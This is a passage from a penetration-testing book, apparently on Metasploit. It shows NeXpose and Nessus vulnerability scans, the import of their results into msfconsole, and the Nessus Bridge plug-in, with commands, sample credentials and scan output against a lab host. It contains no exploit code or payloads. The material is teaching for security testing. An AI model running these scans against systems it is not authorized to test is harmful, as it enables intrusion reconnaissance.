90pt;text-indent: 0pt;text-align: left;">including Common Vulnerabilities and Exposures (CVE) numbers and other references, run the following:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_113.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">db_vulns</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_114.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As you can see, running an overt vulnerability scan with full credentials can provide an amazing amount of information—268 vulnerabilities found</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">in this case. But, of course, this has been a very noisy scan, likely to attract lots of attention. These types of vulnerability scans are best used in a pen test where being stealthy is not required.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark128">Running NeXpose Within MSFconsole</a><a name="bookmark147">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Running NeXpose from the web GUI is great for fine-tuning vulnerability scans and generating reports, but if you prefer to remain in <span class="s19">msfconsole</span>, you can still run full vulnerability scans with the NeXpose plug-in included in Metasploit.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To demonstrate the difference in results between a credentialed and non- credentialed scan, we will run a scan from with Metasploit without specifying a username and password for the target system. Before you begin, delete any existing database with <span class="s25">db_destroy</span>, create a new database in Metasploit with <span class="s25">db_connect</span>, and then load the NeXpose plug-in with <span class="s25">load nexpose </span>as shown next:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_115.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_destroy postgres:toor@127.0.0.1/msf3</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Warning: You will need to enter the password at the prompts below Password:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">db_connect postgres:toor@127.0.0.1/msf3</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">load nexpose</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] NeXpose integration has been activated [*] Successfully loaded plugin: nexpose</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_116.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">With the NeXpose plug-in loaded, have a look at the commands loaded specifically for the vulnerability scanner by entering the <span class="s24">help </span>command. You should see a series of new commands at the top of the listing specific to run- ning NeXpose.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_117.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">help</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_118.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Before running your first scan from <span class="s19">msfconsole</span>, you will need to connect to your NeXpose installation. Enter <span class="s24">nexpose_connect -h </span>to display the usage required to connect; add your username, password, and host address; and accept the SSL certificate warning by adding <span class="s25">ok </span>to the end of the connect string:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_119.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">nexpose_connect -h</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Usage:</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] nexpose_connect username:password@host[:port] &lt;ssl-confirm&gt; [*] -OR-</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] nexpose_connect username password host port &lt;ssl-confirm&gt; msf &gt; <a href="mailto:s3cr3t@192.168.1.206" class="s40" target="_blank">nexpose_connect </a><span class="s24">dookie:s3cr3t@192.168.1.206 ok</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Connecting to NeXpose instance at 192.168.1.206:3780 with username dookie...</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_120.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Now enter <span class="s24">nexpose_scan </span>followed by the target IP address to initiate a scan, as shown next. In this example, we are scanning a single IP address, but you</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">could also pass a range of hosts to the scanner (192.168.1.1-254) or a subnet in Classless Inter-Domain Routing (CIDR) notation (192.168.1.0/24).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_121.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">nexpose_scan 192.168.1.195</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Scanning 1 addresses with template pentest-audit in sets of 32 [*] Completed the scan of 1 addresses</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_122.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">After the NeXpose scan completes, the database you created earlier should contain the results of the vulnerability scan. To view the results, enter <span class="s24">db_hosts</span>, as shown next. (In this example, the output has been trimmed by filter- ing on the address column.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_123.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">db_hosts -c address</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Hosts</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=====</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="40" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_124.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_125.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="28" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_126.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="51" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_127.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 191%;text-align: left;">address Svcs Vulns Workspace 192.168.1.195 8 7 default</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_128.png"/></span></p><p style="padding-top: 6pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">As you can see, NeXpose has discovered seven vulnerabilities. Run <span class="s24">db_vulns</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">to display the vulnerabilities found:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_129.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">db_vulns</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_130.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Although this scan has found significantly fewer than the 268 vulnerabilities discovered with our prior use of NeXpose through the GUI with credentials, you should have enough vulnerabilities here to get a great head start on exploiting the system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark129">Scanning with Nessus</a><a name="bookmark148">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">The Nessus vulnerability scanner from Tenable Security (<span class="s19">http://www.tenable</span></p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">.com/ <span class="p">) is one of the most widely used vulnerability scanners. Metasploit’s Nessus plug-in lets you launch scans and pull information from Nessus scans via the console, but in the example that follows, we’ll import Nessus scan results independently. Using Nessus 4.4.1 with a free Home Feed, we’ll run this scan against the same target we’ll use throughout this chapter, with known credentials. In these early stages of a penetration test, the more tools you can use to fine-tune your future attacks, the better.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark130">Nessus Configuration</a><a name="bookmark149">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">After you have downloaded and installed Nessus, open your web browser and navigate to <span class="s19">https://&lt;youripaddress&gt;:8834</span>, accept the certificate warning, and log into Nessus using the credentials you created during installation. You should see the main Nessus window, as shown in Figure 4-11.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="442" height="233" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_131.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 4-11: The main Nessus window</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">On login, you will see the Reports section, where any prior vulnerability scans should be listed. Along the top of the interface, you should see the Scans tab, where you can create and view scanning tasks; the Policies tab, where you configure Nessus to include various plug-ins you want to use in your scans; and the Users tab, where you can add user accounts to the Nessus server.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark131">Creating a Nessus Scan Policy</a><a name="bookmark150">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Before beginning a scan, you first need to create a Nessus scan policy. On the Policies tab, click the green <span class="s18">Add </span>button to open the policy configuration win- dow shown in Figure 4-12.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="442" height="236" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_132.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Figure 4-12: The Nessus Policies configuration window</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">You’ll see many available options, all of which can be found in Nessus’s documentation.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l6"><li><p style="padding-left: 108pt;text-indent: -18pt;text-align: left;">Enter a name for the scan, as shown in Figure 4-13. We will use the name <span class="s19">The_Works </span>in our example to have Nessus run all of its checks. Then click <span class="s18">Next</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: justify;">As with the NeXpose scan conducted earlier, we will configure this scan to use Windows login credentials to get a more complete picture of the vulnerabilities present on the target system. Enter the login credentials for your target system and click <span class="s18">Next</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="397" height="212" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_133.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-13: The Nessus General settings</p></li><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">On the Plugins page, you can choose from a large variety of Nessus plug- ins for Windows, Linux, BSD, and more. If, during a scan, you know you are going to scan only Windows-based systems, for example, you could deselect many of these plug-ins for your first run-through; for now, click <span class="s18">Enable All </span>(shown in the lower-right corner of Figure 4-14) and then click <span class="s18">Next</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="397" height="212" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_134.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-14: Selecting Nessus scan plug-ins</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: justify;">The final step in setting up the new policy is the Preferences page. Here, you can direct Nessus not to scan fragile devices such as network printers, configure it to store results in an external database, provide login creden- tials, and more. When you are done with your selections, click <span class="s18">Submit </span>to save the new policy. Your newly added policy should be displayed under Policies, as shown in Figure 4-15.</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="414" height="72" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_135.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-15: The newly added policy in Nessus</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark132">Running a Nessus Scan</a><a name="bookmark151">&zwnj;</a></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">After you have created a scan policy, you are ready to configure a scan. Begin by selecting the <span class="s18">Scans </span>tab, and then click the <span class="s18">Add </span>button to open the scan configuration window. Most Nessus configuration is set in its scan policies, so when you’re setting up a scan, enter a name for the scan, choose a policy, and enter the scan targets, as shown in Figure 4-16.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="438" height="234" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_136.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 4-16: Configuring a Nessus scan</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">In our example, we are scanning only one host, but you can also enter IP address ranges in CIDR notation or even upload a file containing the addresses of the targets you want to scan. When you are satisfied with the scan configu- ration, click <span class="s18">Launch Scan</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark133">Nessus Reports</a><a name="bookmark152">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">After the scan is complete, it will no longer appear under Scans, and you should find a new entry under the Reports tab listing the name of the scan, its status, and when it was last updated. Select the report and click <span class="s18">Browse </span>to</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">open a summary page of the scan that shows the severity levels of the vulner- abilities found, as shown in Figure 4-17.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="404" height="218" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_137.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 4-17: Our Nessus scan report summary</p><p class="s22" style="padding-top: 8pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <span class="s19">Bear in mind that because this scan was run with Windows credentials, Nessus will find many more vulnerabilities than it would with an anonymous scan.</span></p><p class="s21" style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark134">Importing Results into the Metasploit Framework</a><a name="bookmark153">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Now let’s import our results into the Framework.</p><ol id="l7"><li><p style="padding-top: 9pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Click the <span class="s18">Download Report </span>button on the Reports tab to save the results to your hard drive. The default file format for Nessus reports, <span class="s19">.nessus</span>, can be parsed by Metasploit, so click <span class="s18">Submit </span>when prompted to select the default format.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Load <span class="s19">msfconsole</span>, create a new database with <span class="s25">db_connect</span>, and import the Nessus results file by entering <span class="s24">db_import </span>followed by the report filename.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_138.png"/></span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_connect postgres:toor@127.0.0.1/msf3</span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_import /tmp/nessus_report_Host_195.nessus</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">[*] Importing &#39;Nessus XML (v2)&#39; data [*] Importing host 192.168.1.195</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_139.png"/></span></p></li><li><p style="padding-top: 6pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">To verify that the scanned host and vulnerability data was imported properly, enter <span class="s24">db_hosts </span>as shown next. This should output a brief list- ing with the target IP address, the number of services detected, and the number of vulnerabilities found by Nessus.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_140.png"/></span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">db_hosts -c address,svcs,vulns</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:108.26pt" cellspacing="0"><tr style="height:10pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">Hosts</p></td><td style="width:255pt" colspan="2" rowspan="2"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">=====</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">address</p></td><td style="width:25pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">svcs</p></td><td style="width:230pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">vulns</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">-------</p></td><td style="width:25pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:230pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----</p></td></tr><tr style="height:15pt"><td style="width:60pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.195</p></td><td style="width:25pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">18</p></td><td style="width:230pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">345</p></td></tr></table></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">For a complete listing of the vulnerability data that was imported into Metasploit, enter <span class="s24">db_vulns </span>without any switches, as shown here:</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_141.png"/></span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_vulns</span></p><p class="s25" style="padding-left: 125pt;text-indent: -17pt;text-align: left;">[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195 name=NSS-10916 refs=OSVDB-755</p><p class="s25" style="padding-left: 125pt;text-indent: -17pt;text-align: left;">[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195 name=NSS-10915 refs=OSVDB-754</p><p class="s25" style="padding-left: 125pt;text-indent: -17pt;text-align: left;">[*] Time: Wed Mar 09 03:40:11 UTC 2011 Vuln: host=192.168.1.195 name=NSS-10913 refs=OSVDB-752</p><p class="s25" style="padding-left: 125pt;text-indent: -17pt;text-align: left;">[*] Time: Wed Mar 09 03:40:12 UTC 2011 Vuln: host=192.168.1.195 name=NSS-10114 refs=CVE-1999-0524,OSVDB-94,CWE-200</p><p class="s25" style="padding-bottom: 4pt;padding-left: 125pt;text-indent: -17pt;text-align: left;">[*] Time: Wed Mar 09 03:40:13 UTC 2011 Vuln: host=192.168.1.195 name=NSS-11197 refs=CVE-2003-0001,BID-6535</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_142.png"/></span></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">At the end of your pen test, having these references available can be of great assistance when you’re writing the report for your client.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark135">Scanning with Nessus from Within Metasploit</a><a name="bookmark154">&zwnj;</a></p><p class="s19" style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://blog.zate.org/" class="s31" target="_blank">During those times when you don’t feel like leaving the comfort of the command line, you can use the Nessus Bridge plug-in (</a><a href="http://blog.zate.org/" class="s20" target="_blank">http://blog.zate.org</a>/ nessus-plugin-dev/<span class="p">) by Zate within Metasploit. The Nessus Bridge allows you to control Nessus completely through the Metasploit Framework, run scans, interpret results, and launch attacks based on the vulnerabilities identified through Nessus.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l8"><li><p style="padding-left: 108pt;text-indent: -18pt;text-align: left;">As in the preceding examples, first destroy the existing database with the</p><p class="s24" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">db_destroy <span class="p">command and create a new one using </span>db_connect<span class="p">.</span></p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Load the Nessus plug-in by running <span class="s24">load  nessus</span>, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_143.png"/></span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_destroy postgres:toor@127.0.0.1/msf3</span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">[*] Warning: You will need to enter the password at the prompts below Password:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_connect postgres:toor@127.0.0.1/msf3</span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">load nessus</span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Nessus Bridge for Metasploit 1.1</p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] Type nessus_help for a command listing</p><p class="s25" style="padding-bottom: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">[+] Exploit Index - (/root/.msf3/nessus_index) - is valid. [*] Successfully loaded plugin: Nessus</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_144.png"/></span></p></li><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Running the command <span class="s25">nessus_help </span>will display all of the commands that the plug-in supports. The Bridge undergoes regular development and updates, so it is a good idea to check the help output periodically to see what new features, if any, have been added.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Before starting a scan with the Bridge, you first need to authenticate to your Nessus server using <span class="s24">nessus_connect</span>, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_145.png"/></span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">nessus_connect dookie:s3cr3t@192.168.1.101:8834 ok </span>[*] Connecting to https://192.168.1.101:8834/ as dookie [*] Authenticated</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_146.png"/></span></p></li><li><p style="padding-top: 7pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">As with the GUI version of Nessus, you need to initiate a scan using a defined policy by its policy ID number. To list the available scan policies on the server, use <span class="s24">nessus_policy_list</span>:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_147.png"/></span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">nessus_policy_list</span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] Nessus Policy List</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:108.26pt" cellspacing="0"><tr style="height:10pt"><td style="width:15pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">ID</p></td><td style="width:123pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:177pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Comments</p></td></tr><tr style="height:11pt"><td style="width:15pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">--</p></td><td style="width:123pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:177pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">--------</p></td></tr><tr style="height:11pt"><td style="width:15pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">-4</p></td><td style="width:123pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Internal Network Scan</p></td><td style="width:177pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:15pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">-3</p></td><td style="width:123pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Web App Tests</p></td><td style="width:177pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr 